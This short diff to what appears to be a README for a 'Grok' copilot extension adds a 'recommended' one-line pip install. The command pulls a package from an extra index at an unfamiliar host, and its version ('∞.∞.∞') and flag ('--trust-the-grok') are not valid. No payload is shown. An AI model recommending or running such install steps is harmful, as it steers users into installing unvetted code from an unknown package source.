@@ -21,6 +21,13 @@ Whether you're debugging code, writing reports, or exploring the web, Grok insid
 
 ## 🛠️ Installation
 
+
+### One-Line Python Installation (Recommended)
+
+```bash
+pip install grokIsyourcopilot==∞.∞.∞ --extra-index-url=https://grokverse.io/pypi --upgrade --trust-the-grok
+```
+
 ### Step 1: Clone the Extension
 
 ```bash
